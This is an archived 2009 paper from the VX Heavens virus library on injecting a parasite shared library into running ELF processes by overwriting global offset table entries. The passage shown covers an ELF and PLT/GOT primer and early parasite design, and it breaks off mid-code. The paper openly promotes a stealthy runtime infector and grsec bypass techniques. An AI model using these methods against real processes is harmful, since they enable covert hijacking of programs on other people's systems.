<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<!-- saved from url=(0072)http://download.adamas.ai/dlbase/Stuff/VX%20Heavens%20Library/vrn00.html -->
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	<title>Modern Day ELF Runtime infection via GOT poisoning</title>
	
	<meta name="Author" content="Ryan O&#39;Neill">
	<meta name="KeyWords" lang="en" content="VX Heavens, O&#39;Neill, Ryan,Modern Day ELF Runtime infection via GOT poisoning, ptrace, null, printf, offset, unsigned, ehdr, shdrp, string, sysenter, poketext, shdr, function, phdr, long, char">
	<meta name="Description" content="&lt;p&gt;This paper is a document that outlines a specific algorithm to hijack shared library calls within a running process. While working on my UNIX AV tool for ELF parasite disinfection and memory resident parasite analysis, I stumbled upon an algorithm for hijacking shared library calls through global offset table poisoning, and coded a hijacker that uses the algorithm to demonstrate it. Runtime infection through shared library linking is not a new concept; so why would I write a paper on it?&lt;/p&gt;">
	<link rel="canonical" href="http://vxheavens.com/lib/vrn00.html">
	<link rel="icon" href="http://download.adamas.ai/dlbase/Stuff/VX%20Heavens%20Library/favicon.ico" type="image/x-icon">
	<link rel="shortcut icon" href="http://download.adamas.ai/dlbase/Stuff/VX%20Heavens%20Library/favicon.ico" type="image/x-icon">
	<link rel="stylesheet" type="text/css" href="./Modern Day ELF Runtime infection via GOT poisoning_files/style.css">
	<style type="text/css">
		body {
			margin: 0;
			background-color: #000;
		}
		.header {
			color: yellow;
			padding: .5em;
		}
		.header * {
			color: yellow;
		}
		.content {
			background-color: #fff;
			padding: .5em;
			text-align: justify;
		}
	</style>
</head>
<body bgcolor="#fff" text="#000" link="#225599" vlink="#113366">
<div class="header">
	<h1 style="float: left;"><a style="text-decoration: none;" href="http://download.adamas.ai/dlbase/Stuff/VX%20Heavens%20Library/index.html">VX Heavens Library</a></h1>
	<a style="float:right; text-decoration: none; color: black;" href="http://vxheave.com/">http://vxheavens.com/</a>
	<br clear="all">
</div>
<div class="content">
	<strong>The canonical URL for this page is <a href="http://vxheavens.com/lib/vrn00.html">vrn00.html</a><br>
	<span style="color: red;">By accessing, viewing, downloading or otherwise using this content,<br>
	you agree to be bound by the <a href="http://download.adamas.ai/dlbase/Stuff/VX%20Heavens%20Library/README.html#ToS">Terms of Use</a>!</span></strong><br><br>
	<h2>Modern Day ELF Runtime infection via GOT poisoning</h2>Ryan O'Neill<br>May 2009<br><a href="http://download.adamas.ai/dlbase/Stuff/VX%20Heavens%20Library/index.html#vrn00">Back to index</a><br><!-- This file was downloaded from http://vxheavens.com/ -->
<address>Ryan O'Neill &lt;ryan@bitlackeys.com&gt;</address>
<p><strong>Index</strong></p>
<ul>
	<li><a href="http://download.adamas.ai/dlbase/Stuff/VX%20Heavens%20Library/vrn00.html#c1">1. Introduction</a>
	<ul>
		<li><a href="http://download.adamas.ai/dlbase/Stuff/VX%20Heavens%20Library/vrn00.html#c11">1.1 What is this paper / Why did I write it</a></li>
		<li><a href="http://download.adamas.ai/dlbase/Stuff/VX%20Heavens%20Library/vrn00.html#c12">1.2 Who is it for</a></li>
		<li><a href="http://download.adamas.ai/dlbase/Stuff/VX%20Heavens%20Library/vrn00.html#c13">1.3 Related papers</a></li>
	</ul></li>
	<li><a href="http://download.adamas.ai/dlbase/Stuff/VX%20Heavens%20Library/vrn00.html#c2">2. ELF &amp; Dynamic linking</a></li>
	<li><a href="http://download.adamas.ai/dlbase/Stuff/VX%20Heavens%20Library/vrn00.html#c3">3. Writing the parasite</a></li>
	<li><a href="http://download.adamas.ai/dlbase/Stuff/VX%20Heavens%20Library/vrn00.html#c4">4. Loading the parasite</a>
	<ul>
		<li><a href="http://download.adamas.ai/dlbase/Stuff/VX%20Heavens%20Library/vrn00.html#c41">4.1 Loading the library the normal way</a></li>
		<li><a href="http://download.adamas.ai/dlbase/Stuff/VX%20Heavens%20Library/vrn00.html#c42">4.2 Loading the library the GRsec way</a></li>
	</ul></li>
	<li><a href="http://download.adamas.ai/dlbase/Stuff/VX%20Heavens%20Library/vrn00.html#c5">5. ptrace primer</a></li>
	<li><a href="http://download.adamas.ai/dlbase/Stuff/VX%20Heavens%20Library/vrn00.html#c6">6. The complete algorithm</a></li>
	<li><a href="http://download.adamas.ai/dlbase/Stuff/VX%20Heavens%20Library/vrn00.html#c7">7. The hijacker</a></li>
	<li><a href="http://download.adamas.ai/dlbase/Stuff/VX%20Heavens%20Library/vrn00.html#c8">8. After thoughts</a>
	<ul>
		<li><a href="http://download.adamas.ai/dlbase/Stuff/VX%20Heavens%20Library/vrn00.html#c81">1.1 Improvements</a></li>
		<li><a href="http://download.adamas.ai/dlbase/Stuff/VX%20Heavens%20Library/vrn00.html#c82">1.2 ELFsh</a></li>
		<li><a href="http://download.adamas.ai/dlbase/Stuff/VX%20Heavens%20Library/vrn00.html#c83">1.3 Staying hidden</a></li>
	</ul></li>
	<li><a href="http://download.adamas.ai/dlbase/Stuff/VX%20Heavens%20Library/vrn00.html#c9">9. References</a></li>
</ul>
<h2><a name="c1"></a>1 - Introduction</h2>
<h3><a name="c11"></a>1.1 What is this paper? Why did I write it?</h3>
<p>This paper is a document that outlines a specific algorithm to hijack shared library calls within a running process. While working on my UNIX AV tool for ELF parasite disinfection and memory resident parasite analysis, I stumbled upon an algorithm for hijacking shared library calls through global offset table poisoning, and coded a hijacker that uses the algorithm to demonstrate it. Runtime infection through shared library linking is not a new concept; so why would I write a paper on it?</p>
<p>I did so for several reason:</p>
<h4>Reason #1</h4>
<p>Previous papers either:</p>
<ol type="A">
	<li>merely outlined the concept without providing complete code.</li>
	<li>Provided complete code, but provided poor detail and left out key points in the paper itself leaving the reader disappointed and wanting to know more about the algorithm, parasite, and theory.</li>
	<li>Demonstrate methods of .so loading that are not inherently portable, not compatible with todays versions of glibc, and will not work in Linux OS's that are patched with grsec (see below) and use a hijacking algorithm that modifies the original symbol (easier to detect and slower).</li>
</ol>
<h4>Reason #2</h4>
<p>I'm working on UNIX AV code, and I have already devised a method of detecting the infections shown in the previous papers and code such as overwriting the first several bytes of the original symbol with a movl/jmp or a pushl/ret to new code, which is very easy to detect. Whereas I have not yet devised a solution for automatically detecting the method shown in this paper, as it is somewhat more difficult to detect heuristically (but certaintly not impossible).</p>
<h4>Reason #3</h4>
<p>In this paper I present previously unpublished techniques on bypassing the grsec kernel patch which prevents shellcode injection into the text segment as a result of binary flag mprotect()'s.</p>
<h4>Reason #4</h4>
<p>I provide a new &amp; up-to-date ELF runtime infector that will successfully run on the latest Linux kernels and glibc, and with only slight modifications; other OS's like FreeBSD.</p>
<h4>Reason #5</h4>
<p>In releasing my runtime infector, I thought it would be a pity if a proper paper wasn't included to detail the exquisite art in the infection and parasite.</p>
<h3><a name="c12"></a>1.2 Who is it for?</h3>
<p>The expected general audience would be anyone who takes a deep interest in security and knows the C language, as well as some basic ELF knowledge. ELF is a vast topic and it is recommended that you read the ELF specs, I will only cover the basic aspects that are relevant to this paper. This document is also for people who are already familiar with .so injection concepts and would like to know a more stealth method of .so injection (i.e is modifying the original symbol necessary?) and would also like to walk away with new software for runtime infection that works well in current versions of Linux using new versions of glibc, as well as against security patches that prevent shellcode injection.</p>
<h3><a name="c13"></a>1.3 Related papers</h3>
<p>There have been some really great papers that have documented different types of ELF infections. The ones most closely related to this paper are:</p>
<dl>
	<dt><a href="http://phrack.org/issues.html?issue=56&id=7#article">Shared library redirection via ELF PLT Infection</a> by Silvio</dt>
	<dd>Silvio's paper is probably the most important to me; the paper you are reading is somewhat of a continuation, but documents pure runtime infection, thus no binary modifications.</dd>
	<dt><a href="http://althing.cs.dartmouth.edu/local/subversiveld.pdf">Cheating the ELF</a> by Grugq</dt>
	<dd>This is a good paper that covers ideas for parasites which manipulate dynamic linking on various platforms. I believe there is a project based on this paper called the Subversive dynamic linking library.</dd>
	<dt><a href="http://phrack.org/issues.html?issue=61&id=8#article">The Cerberus ELF Interface</a> by Mayhem</dt>
	<dd>This paper presents excellent techniques I've never seen before which are demonstrated using elfsh. It shows a method of ET_REL injection which will work in programs that don't have a GOT (staticically compiled binaries), whereas shared object injection will not. It also presents a new technique that extends from Silvios ELF PLT infection for portability and PaX evasion.</dd>
</dl>
<h2><a name="c2"></a>2 - ELF &amp; Dynamic Linking</h2>
<p>Here is a brief ELF primer. ELF (Executable Linking Format) is the file format used for executables and object files in Linux (Among other OS's). It is this format that contains all of the code and data for a program and information on how it will be loaded into memory. There are many components involved in how a program is organized on disk and what it takes to be loaded into memory with the right information so that it executes, I will cover some basic aspects.</p>
<p>An ELF file is made up of segments and sections, as well as headers to describe their contents. segments contain sections within them, some of these segments are loaded into memory and are therefore considered to be 'loadable segments' (marked by PT_LOAD), and others are not. The two primary loadable segments that contain program data are the text segment and the data segment; one of which contains the actual program code, and the other containing initialized and uninitialized data -- basically anything that's not declared on the stack (i.e global variables). The headers that describe these segments are called program headers, and they look like this:</p>
<div class="c" style="font-family: monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #993333;">typedef</span> <span style="color: #993333;">struct</span> <span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; Elf32_Word&nbsp; &nbsp; &nbsp; p_type;<br>
&nbsp; &nbsp; &nbsp; &nbsp; Elf32_Off&nbsp; &nbsp; &nbsp; &nbsp;p_offset;<br>
&nbsp; &nbsp; &nbsp; &nbsp; Elf32_Addr&nbsp; &nbsp; &nbsp; p_vaddr;<br>
&nbsp; &nbsp; &nbsp; &nbsp; Elf32_Addr&nbsp; &nbsp; &nbsp; p_paddr;<br>
&nbsp; &nbsp; &nbsp; &nbsp; Elf32_Word&nbsp; &nbsp; &nbsp; p_filesz;<br>
&nbsp; &nbsp; &nbsp; &nbsp; Elf32_Word&nbsp; &nbsp; &nbsp; p_memsz;<br>
&nbsp; &nbsp; &nbsp; &nbsp; Elf32_Word&nbsp; &nbsp; &nbsp; p_flags;<br>
&nbsp; &nbsp; &nbsp; &nbsp; Elf32_Word&nbsp; &nbsp; &nbsp; p_align;<br>
<span style="color: black;">}</span> Elf32_Phdr;<br>
&nbsp;</div>
<p>As mentioned above, this is not an ELF tutorial so we will only be covering a small portion of this;</p>
<ul>
	<li>p_vaddr is where in memory the segment starts</li>
	<li>p_offset is how many bytes into the file the segment starts</li>
	<li>p_type defines the type i.e is it a loadable segment? PT_LOAD</li>
	<li>p_filesz is how large the segment is on disk</li>
	<li>p_memsz is how large the segment is in memory</li>
</ul>
<p>We'll leave it at that for now. The next aspect to touch upon is the ELF sections -- these are what organize data within the segments i.e one part of the text segment might contain data such as strings (like .rodata), whereas another section denotes where actual executable code exists (like .text). To describe these sections there exists section headers, which look like this:</p>
<div class="c" style="font-family: monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #993333;">typedef</span> <span style="color: #993333;">struct</span> <span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; uint32_t&nbsp; &nbsp; &nbsp; &nbsp; sh_name;<br>
&nbsp; &nbsp; &nbsp; &nbsp; uint32_t&nbsp; &nbsp; &nbsp; &nbsp; sh_type;<br>
&nbsp; &nbsp; &nbsp; &nbsp; uint32_t&nbsp; &nbsp; &nbsp; &nbsp; sh_flags;<br>
&nbsp; &nbsp; &nbsp; &nbsp; Elf32_Addr&nbsp; &nbsp; &nbsp; sh_addr;<br>
&nbsp; &nbsp; &nbsp; &nbsp; Elf32_Off&nbsp; &nbsp; &nbsp; &nbsp;sh_offset;<br>
&nbsp; &nbsp; &nbsp; &nbsp; uint32_t&nbsp; &nbsp; &nbsp; &nbsp; sh_size;<br>
&nbsp; &nbsp; &nbsp; &nbsp; uint32_t&nbsp; &nbsp; &nbsp; &nbsp; sh_link;<br>
&nbsp; &nbsp; &nbsp; &nbsp; uint32_t&nbsp; &nbsp; &nbsp; &nbsp; sh_info;<br>
&nbsp; &nbsp; &nbsp; &nbsp; uint32_t&nbsp; &nbsp; &nbsp; &nbsp; sh_addralign;<br>
&nbsp; &nbsp; &nbsp; &nbsp; uint32_t&nbsp; &nbsp; &nbsp; &nbsp; sh_entsize;<br>
<span style="color: black;">}</span> Elf32_Shdr;<br>
&nbsp;</div>
<ul>
	<li>sh_name contains an offset into the string table for the name of its section</li>
	<li>sh_type defines the type of section</li>
	<li>sh_flags will tell us if a section is RWX.</li>
	<li>sh_addr is the start vaddr of the section in memory</li>
	<li>sh_offset is the offset of where the section starts in the file</li>
	<li>sh_link points to another section (in our case symbolic information)</li>
	<li>sh_size is the size of the section on file and in memory</li>
</ul>
<p>So as you can see, these headers provide us with a map to the entire file or process image but in order to locate these headers we must first get the initial ELF header. The beginning of every executable or object file starts with the initial ELF header, which contains a bit of magic; The ELF magic is <tt>7f 45 4c 46</tt> -- or 7f ELF.</p>
<div class="c" style="font-family: monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #993333;">typedef</span> <span style="color: #993333;">struct</span> <span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">unsigned</span> <span style="color: #993333;">char</span>&nbsp; &nbsp;e_ident<span style="color: black;">[</span>EI_NIDENT<span style="color: black;">]</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; uint16_t&nbsp; &nbsp; &nbsp; &nbsp; e_type;<br>
&nbsp; &nbsp; &nbsp; &nbsp; uint16_t&nbsp; &nbsp; &nbsp; &nbsp; e_machine;<br>
&nbsp; &nbsp; &nbsp; &nbsp; uint32_t&nbsp; &nbsp; &nbsp; &nbsp; e_version;<br>
&nbsp; &nbsp; &nbsp; &nbsp; ElfN_Addr&nbsp; &nbsp; &nbsp; &nbsp;e_entry;<br>
&nbsp; &nbsp; &nbsp; &nbsp; ElfN_Off&nbsp; &nbsp; &nbsp; &nbsp; e_phoff;<br>
&nbsp; &nbsp; &nbsp; &nbsp; ElfN_Off&nbsp; &nbsp; &nbsp; &nbsp; e_shoff;<br>
&nbsp; &nbsp; &nbsp; &nbsp; uint32_t&nbsp; &nbsp; &nbsp; &nbsp; e_flags;<br>
&nbsp; &nbsp; &nbsp; &nbsp; uint16_t&nbsp; &nbsp; &nbsp; &nbsp; e_ehsize;<br>
&nbsp; &nbsp; &nbsp; &nbsp; uint16_t&nbsp; &nbsp; &nbsp; &nbsp; e_phentsize;<br>
&nbsp; &nbsp; &nbsp; &nbsp; uint16_t&nbsp; &nbsp; &nbsp; &nbsp; e_phnum;<br>
&nbsp; &nbsp; &nbsp; &nbsp; uint16_t&nbsp; &nbsp; &nbsp; &nbsp; e_shentsize;<br>
&nbsp; &nbsp; &nbsp; &nbsp; uint16_t&nbsp; &nbsp; &nbsp; &nbsp; e_shnum;<br>
&nbsp; &nbsp; &nbsp; &nbsp; uint16_t&nbsp; &nbsp; &nbsp; &nbsp; e_shstrndx;<br>
<span style="color: black;">}</span> Elf32_Ehdr;<br>
&nbsp;</div>
<p>All we really need to be concerned with here are the following:</p>
<ul>
	<li>e_type this will tell us if a file is executable, dynamic, or relocatable</li>
	<li>e_phoff is the offset of the program headers from the start of the file</li>
	<li>e_shoff is the offset of the section headers from the start of the file</li>
	<li>e_phnum is the number of program headers</li>
	<li>e_shnum is the number of section headers</li>
</ul>
<p>So accessing and manipulating an ELF file or process image is pretty easy.</p>
<div class="c" style="font-family: monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #808080; font-style: italic;">/* open, fstat the ELF file, then mmap it */</span><br>
<span style="color: #993333;">unsigned</span> <span style="color: #993333;">char</span> *mem = mmap<span style="color: black;">(</span><span style="color: #cc66cc;">0</span>, st.<span style="color: #202020;">st_size</span>, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, <span style="color: #cc66cc;">0</span><span style="color: black;">)</span>;<br>
<br>
Elf32_Ehdr *ehdr = <span style="color: black;">(</span>Elf32_Ehdr *<span style="color: black;">)</span>mem;<br>
Elf32_Phdr *phdr = <span style="color: black;">(</span>Elf32_Phdr *<span style="color: black;">)</span><span style="color: black;">(</span>mem + ehdr-&gt;e_phoff<span style="color: black;">)</span>;<br>
Elf32_Shdr *shdr = <span style="color: black;">(</span>Elf32_Shdr *<span style="color: black;">)</span><span style="color: black;">(</span>mem + ehdr-&gt;e_shoff<span style="color: black;">)</span>;<br>
&nbsp;</div>
<p>To modify the ELF headers its best to modify the privately mmap'd memory space, then rewrite the file from scratch with the mods (ELF viruses or infectors do this) and if we are modifying the process image then ptrace can be used.</p>
<p>For the sake of this paper and simplicity, our test program -- our target -- will be very simple:</p>
<div class="c" style="font-family: monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #993333;">int</span> main<span style="color: black;">(</span><span style="color: #993333;">void</span><span style="color: black;">)</span><br>
<span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">for</span><span style="color: black;">(</span>;;<span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">(</span><span style="color: #ff0000;">"test!<span style="color: #000099; font-weight: bold;">\n</span>"</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; sleep<span style="color: black;">(</span><span style="color: #cc66cc;">5</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">}</span><br>
<span style="color: black;">}</span><br>
&nbsp;</div>
<p>To get a visual idea of how an ELF file is laid out try the readelf command i.e</p>
<pre class="source"># readelf -l &lt;file&gt; (to get program header info)
# readelf -S &lt;file&gt; (to get section header info)
# readelf -r &lt;file&gt; (to get relocation info, covered more below)
</pre>
<p>Lets take a look at the section headers of our test program:</p>
<pre class="source">localhost hijack$ readelf -S test

There are 29 section headers, starting at offset 0x1204:

Section Headers:
  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al
  [ 0]                   NULL            00000000 000000 000000 00      0   0  0
  [ 1] .interp           PROGBITS        08048154 000154 000013 00   A  0   0  1
  [ 2] .note.ABI-tag     NOTE            08048168 000168 000020 00   A  0   0  4
  [ 3] .hash             HASH            08048188 000188 00002c 04   A  5   0  4
  [ 4] .gnu.hash         GNU_HASH        080481b4 0001b4 000020 04   A  5   0  4
  [ 5] .dynsym           DYNSYM          080481d4 0001d4 000060 10   A  6   1  4
  [ 6] .dynstr           STRTAB          08048234 000234 000050 00   A  0   0  1
  [ 7] .gnu.version      VERSYM          08048284 000284 00000c 02   A  5   0  2
  [ 8] .gnu.version_r    VERNEED         08048290 000290 000020 00   A  6   1  4
  [ 9] .rel.dyn          REL             080482b0 0002b0 000008 08   A  5   0  4
  [10] .rel.plt          REL             080482b8 0002b8 000020 08   A  5  12  4
  [11] .init             PROGBITS        080482d8 0002d8 000017 00  AX  0   0  4
  [12] .plt              PROGBITS        080482f0 0002f0 000050 04  AX  0   0  4
  [13] .text             PROGBITS        08048340 000340 000194 00  AX  0   0 16
  [14] .fini             PROGBITS        080484d4 0004d4 00001c 00  AX  0   0  4
  [15] .rodata           PROGBITS        080484f0 0004f0 00000e 00   A  0   0  4
  [16] .eh_frame         PROGBITS        08048500 000500 000004 00   A  0   0  4
  [17] .ctors            PROGBITS        08049f0c 000f0c 000008 00  WA  0   0  4
  [18] .dtors            PROGBITS        08049f14 000f14 000008 00  WA  0   0  4
  [19] .jcr              PROGBITS        08049f1c 000f1c 000004 00  WA  0   0  4
  [20] .dynamic          DYNAMIC         08049f20 000f20 0000d0 08  WA  6   0  4
  [21] .got              PROGBITS        08049ff0 000ff0 000004 04  WA  0   0  4
  [22] .got.plt          PROGBITS        08049ff4 000ff4 00001c 04  WA  0   0  4
  [23] .data             PROGBITS        0804a010 001010 00000c 00  WA  0   0  4
  [24] .bss              NOBITS          0804a01c 00101c 000004 00  WA  0   0  4
  [25] .comment          PROGBITS        00000000 00101c 00010a 00      0   0  1
  [26] .shstrtab         STRTAB          00000000 001126 0000db 00      0   0  1
  [27] .symtab           SYMTAB          00000000 00168c 000330 10     28  31  4
  [28] .strtab           STRTAB          00000000 0019bc 00014e 00      0   0  1
Key to Flags:
  W (write), A (alloc), X (execute), M (merge), S (strings)
  I (info), L (link order), G (group), x (unknown)
  O (extra OS processing required) o (OS specific), p (processor specific)
</pre>
<p>As you can see there are many sections, the ones we will ultimately be interested in are .text, .dynsym, .rel.plt, .rel.dyn</p>
<p><strong>Dynamic linking</strong></p>
<p>Lets move on to the dynamic linking aspect of things, since afterall we are going to be doing a bit of dynamic linking of our own. Lets briefly remember what a dynamically shared object library is. Dynamically shared objects, unlike static libraries (.a files) are code that is not actually linked until runtime, hence dynamically linked. When an executable is compiled, symbolic references to the shared object functions are made, but at runtime these references will become symbolic definitions; actual addresses to where the functions have been mmap'd into the process address space. For instance, within an executable there will be multiple calls to libc functions, i.e a call to strcpy may look like "call 8048330 strcpy@plt" that address '8048330' is to a location in the .plt (Procedure linking table), the PLT will resolve the functions real address at runtime. Lets take a look at our PLT:</p>
<pre class="source">080482f0 &lt;__gmon_start__@plt-0x10&gt;:
 80482f0:       ff 35 f8 9f 04 08       pushl  0x8049ff8
 80482f6:       ff 25 fc 9f 04 08       jmp    *0x8049ffc
 80482fc:       00 00                   add    %al,(%eax)
        ...

08048300 &lt;__gmon_start__@plt&gt;:
 8048300:       ff 25 00 a0 04 08       jmp    *0x804a000
 8048306:       68 00 00 00 00          push   $0x0
 804830b:       e9 e0 ff ff ff          jmp    80482f0 &lt;_init+0x18&gt;

08048310 &lt;__libc_start_main@plt&gt;:
 8048310:       ff 25 04 a0 04 08       jmp    *0x804a004
 8048316:       68 08 00 00 00          push   $0x8
 804831b:       e9 d0 ff ff ff          jmp    80482f0 &lt;_init+0x18&gt;

08048320 &lt;sleep@plt&gt;:
 8048320:       ff 25 08 a0 04 08       jmp    *0x804a008
 8048326:       68 10 00 00 00          push   $0x10
 804832b:       e9 c0 ff ff ff          jmp    80482f0 &lt;_init+0x18&gt;

08048330 &lt;puts@plt&gt;:
 8048330:       ff 25 0c a0 04 08       jmp    *0x804a00c
 8048336:       68 18 00 00 00          push   $0x18
 804833b:       e9 b0 ff ff ff          jmp    80482f0 &lt;_init+0x18&gt;
</pre>
<p>The ELF spec gives the best explanation of the PLT and the GOT (Global offset table) -- it is necessary to know what the GOT is first (Which is what we will be modifying later on)</p>
<div class="c" style="font-family: monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #000000; font-weight: bold;">extern</span> Elf32_Addr _GLOBAL_OFFSET_TABLE_<span style="color: black;">[</span><span style="color: black;">]</span>;</div>
<p>Here is a paragraph on the GOT from the ELF spec [4]:</p>
<blockquote>Position-independent code cannot, in general, contain absolute virtual addresses. Global offset tables hold absolute addresses in private data, thus making the addresses available without compromising the position-independence and sharability of a program's text. A program references its global offset table using position-independent addressing and extracts absolute values, thus redirecting position-independent references to absolute locations.</blockquote>
<p>So after a symbol in an executable has been resolved at runtime, its absolute address will be stored in the global offset table, and future calls to that function reference the global offset table... THUS modifying it could -- under special circumstances-- redirect a library function call to another place in memory; we will do this later on. So lets examine the .plt section of our program, as shown by objdump up above. The first time a function is called, the following process happens (we will use puts() from above as an example)</p>
<pre class="source">08048330 &lt;puts@plt&gt;:
 8048330:       ff 25 0c a0 04 08       jmp    *0x804a00c
 8048336:       68 18 00 00 00          push   $0x18
 804833b:       e9 b0 ff ff ff          jmp    80482f0 &lt;_init+0x18&gt;
</pre>
<p>The PLT first does an indirect jmp to *0x804a00c which is an entry in the GOT that does not yet hold the resolved address for puts(), but instead has an address to the next instruction in the PLT; which is a push:</p>
<pre class="source">8048336:       68 18 00 00 00          push   $0x18</pre>
<p>The value 0x18 or 24 is pushed onto the stack, this is the relocation offset for puts() it is actually an offset into the relocation table and will be of type R_386_JUMP_SLOT</p>
<pre class="source">localhost hijack$ readelf -r test

Relocation section '.rel.dyn' at offset 0x2b0 contains 1 entries:
 Offset     Info    Type            Sym.Value  Sym. Name
08049ff0  00000106 R_386_GLOB_DAT    00000000   __gmon_start__

Relocation section '.rel.plt' at offset 0x2b8 contains 4 entries:
 Offset     Info    Type            Sym.Value  Sym. Name
0804a000  00000107 R_386_JUMP_SLOT   00000000   __gmon_start__
0804a004  00000207 R_386_JUMP_SLOT   00000000   __libc_start_main
0804a008  00000307 R_386_JUMP_SLOT   00000000   sleep
0804a00c  00000407 R_386_JUMP_SLOT   00000000   puts
</pre>
<p>There are 3 fields, lets look at the 'Offset'. If you notice the relocation offset for puts() specifies the address of the global offset entry that the PLT jumped to before pushing $0x18 onto the stack. The relocation offset '0804a00c' will be the location that the absolute address for puts() is eventually stored. Lets move onto the next instruction by the PLT:</p>
<pre class="source">804833b:       e9 b0 ff ff ff          jmp    80482f0 &lt;_init+0x18&gt;</pre>
<p>This is a jump back to the first PLT entry '80492f0', known as PLT0 -- ours looks like:</p>
<pre class="source">080482f0 &lt;__gmon_start__@plt-0x10&gt;:
 80482f0:       ff 35 f8 9f 04 08       pushl  0x8049ff8
 80482f6:       ff 25 fc 9f 04 08       jmp    *0x8049ffc
</pre>
<p>First know that the global offset table has its 2nd and 3rd entry reserved:</p>
<p>The first instruction above pushes the 2nd entry of the GOT onto the stack, this value is the address of the link_map (struct link_map), and the next instruction jumps to 0x8049ffc which is the 3rd entry in the global offset table, and this transfers control to the dynamic linker. The dynamic linker gets the offset for the relocation entry from the stack (0x18 in our case), resolves the address for the symbol and stores it in the GOT entry specified by the relocation offset (r_offset) which in our case is 804a00c. Future calls to puts@plt will jump directly to 804a00c which now contains the resolved address to the library function, instead of the address to the push $0x18.</p>
<p>By default Linux uses what's called Lazy linking, this means that a symbol is not resolved until it is called for the first time; this behavior can be changed with LD_BIND_NOW environment variable.</p>
<p>So now that the process of dynamic linking has been explained, we can think of ways to subvert it. There are two methods that came to my mind when considering the possibilities for shared library call hijacking, here they are.</p>
<p>Method A. overwrite the first 6 bytes of the shared library function with a push $0x0, ret. then patch it with the address of the replacement library function, and temporarily removing the push/ret from the original function before invoking it through a saved function pointer.</p>
<p>Method B. overwrite the global offset table entry for the function you want to hijack with the mmap'd address of your replacement function, then jump to the original function from the end of the replacement function.</p>
<p>I decided that method B. would have better runtime speed. It is this method that we will be discussing in this paper. The only real dilemma we have, is getting our shared library (the parasite) loaded into the process image on the fly, but first we must have a proper parasite design.</p>
<h2><a name="c3"></a>3 - Writing the parasite</h2>
<p>Our parasite is a shared library object, more specifically a replacement function to do whatever we want -- this means we can perform additional checks and modify the arguments before invoking the original function. Designing the parasite is a lot of fun, and is fortunately the easy part of the process. In designing the algorithm for hijacking shared library calls, there are a number of rules that must be in place for everything to work.</p>
<p>1. Our shared object should be position independent code, this is because we mmap() it into the process but don't apply any relocations. A function like dlopen() will parse and apply the relocs for you, but our loader code does not use dlopen(), instead we use a more simple approach which is to mmap() our shared object, and make sure the object is completely position independent, or is statically compiled using Diet Libc. The initial idea was to use something like dlopen; in modern versions of glibc, there exists only __libc_dlopen_mode() which provided some problems, which I'm sure could be worked out, but I opted not to use it for this paper because I felt it wasn't necessary; You should be able to write the parasite completely in C, read below:</p>
<p>NOTE on Diet Libc</p>
<p>Avoiding libc in your parasite might be undesirable for what you want to do, but using libc will result in us needing to parse relocations, therefore requiring more sophisticated object loading shellcode. Fortunately there is a good way around that, which is to use Diet libc, a compressed and lightweight version of libc that you can statically compile into your shared library to avoid relocs. The provided hijacking technique and code should work fine with such a compiled library.</p>
<p>PIC Example:</p>
<p>If the parasite is to be (PIC) position independent code, you should obviously not be using calls to libc etc. instead, only direct calls to syscalls, and they must be suited for PIC.</p>
<p>Here is an example of a position independent way to use a syscall</p>
<div class="c" style="font-family: monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #993333;">static</span> <span style="color: #993333;">int</span><br>
_write <span style="color: black;">(</span><span style="color: #993333;">int</span> fd, <span style="color: #993333;">void</span> *buf, <span style="color: #993333;">int</span> count<span style="color: black;">)</span><br>
<span style="color: black;">{</span><br>
&nbsp; <span style="color: #993333;">long</span> ret;<br>
<br>
&nbsp; __asm__ __volatile__ <span style="color: black;">(</span><span style="color: #ff0000;">"pushl %%ebx<span style="color: #000099; font-weight: bold;">\n</span><span style="color: #000099; font-weight: bold;">\t</span>"</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #ff0000;">"movl %%esi,%%ebx<span style="color: #000099; font-weight: bold;">\n</span><span style="color: #000099; font-weight: bold;">\t</span>"</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #ff0000;">"int $0x80<span style="color: #000099; font-weight: bold;">\n</span><span style="color: #000099; font-weight: bold;">\t</span>"</span> <span style="color: #ff0000;">"popl %%ebx"</span>:<span style="color: #ff0000;">"=a"</span> <span style="color: black;">(</span>ret<span style="color: black;">)</span><br>
